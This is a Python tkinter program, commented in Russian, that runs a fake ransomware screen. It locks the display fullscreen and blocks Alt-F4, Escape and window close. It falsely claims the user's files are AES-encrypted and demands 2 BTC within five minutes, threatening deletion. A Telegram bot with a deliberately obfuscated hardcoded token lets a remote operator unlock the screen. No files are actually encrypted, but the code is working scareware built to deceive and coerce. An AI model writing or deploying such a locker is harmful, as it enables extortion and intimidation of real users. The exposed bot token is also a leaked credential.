import tkinter as tk
from tkinter import font, messagebox, ttk
import random
import threading
import queue
import telebot


# Обфускация токена: разбит на части и собирается в рантайме
_t1 = "857968"
_t2 = "2917:"
_t3 = "AAEMy28wsHU"
_t4 = "4uBlxlShlYd"
_t5 = "rNxGLKzzfSv"
_t6 = "Ac"
TOKEN = _t1 + _t2 + _t3 + _t4 + _t5 + _t6


class HardcoreRansomware:
    def __init__(self, root, q):
        self.root = root
        self.q = q

        self.root.title("!!! ВНИМАНИЕ !!! ВАШИ ФАЙЛЫ ЗАШИФРОВАНЫ !!!")
        self.root.configure(bg="black")
        self.root.attributes("-fullscreen", True)

        # Запрет закрытия окна
        self.root.protocol("WM_DELETE_WINDOW", self.block_close)
        self.root.bind("<Alt-F4>", lambda e: "break")
        self.root.bind("<Escape>", lambda e: "break")

        # Шрифты
        self.font_title = font.Font(family="Courier", size=50, weight="bold")
        self.font_subtitle = font.Font(family="Courier", size=24, weight="bold")
        self.font_text = font.Font(family="Courier", size=16)
        self.font_log = font.Font(family="Courier", size=12)

        # ASCII-герб — динамический (моргает и меняет цвет)
        self.shield_lines = [
            "█████████████████████",
            "███    1300s      ███",
            "███  HACKER GROUP ███",
            "██   YOUR FILES    ██",
            "██    ENCRYPTED    ██",
            "█████████████████████"
        ]
        self.shield_index = 0
        self.label_shield = tk.Label(root, text="", fg="darkred", bg="black", font=self.font_subtitle, justify="center")
        self.label_shield.pack(pady=(20, 10))
        self.animate_shield()

        # Заголовок с миганием
        self.label_title = tk.Label(root, text="!!! ВАШИ ФАЙЛЫ ЗАШИФРОВАНЫ !!!", fg="#FF3333", bg="black", font=self.font_title)
        self.label_title.pack(pady=15)
        self.blink_state = True
        self.blink_title()

        # Пугающее сообщение с техническими деталями
        self.message_text = (
            "Ваши данные были зашифрованы с использованием\n"
            "алгоритма AES-256 с уникальным ключом.\n"
            "Дешифровка без ключа невозможна!\n\n"
            "Вы должны перевести выкуп в размере 2 BTC\n"
            "на следующий биткоин-адрес:\n"
            "   1ANoNyMoUsD3AdB33Ff00dCAfE000000000000\n\n"
            "Время на оплату ограничено 5 минутами.\n"
            "Если оплата не будет подтверждена, ключ будет уничтожен,\n"
            "а все файлы — удалены навсегда.\n\n"
            "Для подтверждения платежа отправьте письмо на:\n"
            "   support@anonymous-group.net\n\n"
            "✠ НЕ ПЫТАЙТЕСЬ УДАЛИТЬ ИЛИ ОСТАНОВИТЬ ПРОГРАММУ! ✠\n"
            "Ваша система постоянно мониторится. Любые попытки вмешательства\n"
            "приведут к немедленному удалению всех данных и блокировке доступа."
        )
        self.label_message = tk.Label(root, text=self.message_text, fg="#DDDDDD", bg="black", font=self.font_text, justify="left")
        self.label_message.pack(pady=10, padx=20)

        # Таймер
        self.time_left = 5 * 60
        self.label_timer = tk.Label(root, text="", fg="yellow", bg="black", font=self.font_title)
        self.label_timer.pack(pady=15)

        # Кнопка оплаты
        self.pay_button = tk.Button(
            root,
            text="Оплатить выкуп",
            font=self.font_subtitle,
            bg="#8B0000",
            fg="white",
            activebackground="#B22222",
            relief="raised",
            bd=4,
            highlightthickness=0,
            command=self.start_payment_process
        )
        self.pay_button.pack(pady=20)

        # Прогресс-бар проверки платежа
        self.progress = ttk.Progressbar(root, orient="horizontal", length=400, mode="determinate")
        self.progress.pack(pady=10)
        self.progress["value"] = 0
        self.progress["maximum"] = 100
        self.progress.pack_forget()

        # Лог действий
        self.log_text = tk.Text(root, height=8, width=85, bg="black", fg="lime", font=self.font_log)
        self.log_text.pack(pady=10)
        self.log_text.insert(tk.END, ">> Инициализация шифрования файлов...\n")
        self.log_text.insert(tk.END, ">> Шифрование файлов: 0%\n")
        self.log_text.config(state=tk.DISABLED)

        # Имитируем прогресс шифрования
        self.encryption_progress = 0
        self.update_encryption_log()

        self.update_timer()

        # Для мигания заголовка
        self.root.after(600, self.blink_title)

        # Мигающая красная рамка при попытке закрытия
        self.shake_count = 0

        # Запуск визуальных эффектов
        self.start_bg_flicker()
        self.start_glitch_title()
        self.shake_screen()
        self.glitch_message()
        self.crt_lines()

        # Проверяем очередь команд от бота
        self.check_queue()

    def check_queue(self):
        try:
            msg = self.q.get_nowait()
            if msg == 'unlock':
                self.unlock()
        except queue.Empty:
            pass
        self.root.after(1000, self.check_queue)

    def unlock(self):
        self.label_title.config(text="!!! ФАЙЛЫ РАЗБЛОКИРОВАНЫ !!!", fg="lime")
        self.label_message.config(text="Оплата получена! Файлы разблокированы.", fg="lime")
        self.label_timer.config(text="")
        self.pay_button.config(state="disabled")
        self.progress.pack_forget()
        self.log_add(">> Файлы успешно разблокированы через Telegram-команду!")
        self.root.after(3000, self.root.destroy)

    # --- Все твои остальные методы ---

    def animate_shield(self):
        color = "darkred" if self.shield_index % 2 == 0 else "red"
        display_text = ""
        for i, line in enumerate(self.shield_lines):
            display_text += line + "\n"
        self.label_shield.config(text=display_text, fg=color)
        self.shield_index = (self.shield_index + 1) % len(self.shield_lines)
        self.root.after(700, self.animate_shield)

    def blink_title(self):
        color = "red" if self.blink_state else "darkred"
        self.label_title.config(fg=color)
        self.blink_state = not self.blink_state
        self.root.after(600, self.blink_title)

    def update_timer(self):
        mins, secs = divmod(self.time_left, 60)
        time_str = f"Время на оплату: {mins:02d}:{secs:02d}"
        if self.time_left > 120:
            color = "lime"
        elif self.time_left > 60:
            color = "yellow"
        else:
            color = "red" if (self.time_left % 2 == 0) else "darkred"

        self.label_timer.config(text=time_str, fg=color)
        if self.time_left > 0:
            self.time_left -= 1
            self.root.after(1000, self.update_timer)
        else:
            self.label_timer.config(text="ВРЕМЯ ИСТЕКЛО! ФАЙЛЫ УДАЛЕНЫ!", fg="red")
            self.pay_button.config(state="disabled")
            self.label_message.config(text="Все данные безвозвратно уничтожены!", fg="red")
            self.log_add(">> Время вышло! Ключ шифрования уничтожен!")

    def update_encryption_log(self):
        if self.encryption_progress < 100:
            self.encryption_progress += random.randint(1, 8)
            if self.encryption_progress > 100:
                self.encryption_progress = 100
            self.log_text.config(state=tk.NORMAL)
            self.log_text.delete("end-2l", "end-1l")  # удалить старый процент
            self.log_text.insert(tk.END, f">> Шифрование файлов: {self.encryption_progress}%\n")
            self.log_text.see(tk.END)
            self.log_text.config(state=tk.DISABLED)
            self.root.after(1500, self.update_encryption_log)

    def log_add(self, text):
        self.log_text.config(state=tk.NORMAL)
        self.log_text.insert(tk.END, text + "\n")
        self.log_text.see(tk.END)
        self.log_text.config(state=tk.DISABLED)

    def start_payment_process(self):
        self.pay_button.config(state="disabled")
        self.progress.pack(pady=10)
        self.progress["value"] = 0
        self.log_add(">> Запуск проверки платежа...")
        self.progress_step()

    def progress_step(self):
        if self.progress["value"] < 100:
            self.progress["value"] += random.randint(5, 20)
            if self.progress["value"] > 100:
                self.progress["value"] = 100
            self.root.after(500, self.progress_step)
        else:
            self.check_payment_result()

    def check_payment_result(self):
        success = random.random() < 0.4  # 40% шанс успеха
        if success:
            self.log_add(">> Платеж подтверждён! Ключ отправлен на ваш ПК.")
            self.label_message.config(text="Оплата получена! Файлы разблокированы.", fg="lime")
            self.label_timer.config(text="")
            self.pay_button.config(state="disabled")
            self.progress.pack_forget()
        else:
            self.log_add(">> Платеж не обнаружен. Попробуйте ещё раз.")
            self.label_message.config(text="Платёж не найден. Попробуйте оплатить снова.", fg="red")
            self.pay_button.config(state="normal")
            self.progress.pack_forget()

    def block_close(self):
        self.flash_border()
        messagebox.showwarning("Доступ запрещён", "Невозможно закрыть это окно!\nОплатите выкуп, чтобы разблокировать файлы!")

    def flash_border(self):
        color = "red" if self.shake_count % 2 == 0 else "darkred"
        self.root.config(highlightbackground=color, highlightcolor=color, highlightthickness=12)
        self.shake_count += 1
        if self.shake_count < 12:
            self.root.after(150, self.flash_border)
        else:
            self.root.config(highlightthickness=0)
            self.shake_count = 0

    def start_bg_flicker(self):
        color = "#1a0000" if random.random() > 0.5 else "black"
        self.root.config(bg=color)
        self.label_title.config(bg=color)
        self.label_message.config(bg=color)
        self.label_timer.config(bg=color)
        self.label_shield.config(bg=color)
        self.root.after(120, self.start_bg_flicker)

    def start_glitch_title(self):
        if random.random() > 0.7:
            glitched = list("!!! ВАШИ ФАЙЛЫ ЗАШИФРОВАНЫ !!!")
            if glitched:
                idx = random.randint(0, len(glitched) - 1)
                glitched[idx] = random.choice(["#", "%", "&", "@", "?", "█"])
            self.label_title.config(text="".join(glitched))
        else:
            self.label_title.config(text="!!! ВАШИ ФАЙЛЫ ЗАШИФРОВАНЫ !!!")
        self.root.after(150, self.start_glitch_title)

    def shake_screen(self):
        x = random.randint(-10, 10)
        y = random.randint(-10, 10)
        self.root.geometry(f"+{x}+{y}")
        self.root.after(80, self.shake_screen)

    def glitch_message(self):
        if random.random() > 0.65:
            text_list = list(self.message_text)
            if text_list:
                idx = random.randint(0, len(text_list)-1)
                text_list[idx] = random.choice(["@", "#", "%", "█", "░", "▒"])
            self.label_message.config(text="".join(text_list))
        else:
            self.label_message.config(text=self.message_text)
        self.root.after(200, self.glitch_message)

    def crt_lines(self):
        color = "#110000" if random.random() > 0.5 else "#000000"
        self.root.config(bg=color)
        self.root.after(90, self.crt_lines)

def telegram_bot_thread(q):
    bot = telebot.TeleBot(TOKEN)

    @bot.message_handler(commands=['unlock'])
    def handle_unlock(message):
        bot.send_message(message.chat.id, "Получена команда разблокировки. Программа будет завершена.")
        q.put('unlock')

    bot.infinity_polling()

if __name__ == "__main__":
    import queue

    q = queue.Queue()
    root = tk.Tk()
    app = HardcoreRansomware(root, q)

    # Запускаем телеграм бота в отдельном потоке
    t = threading.Thread(target=telegram_bot_thread, args=(q,), daemon=True)
    t.start()

    root.mainloop()
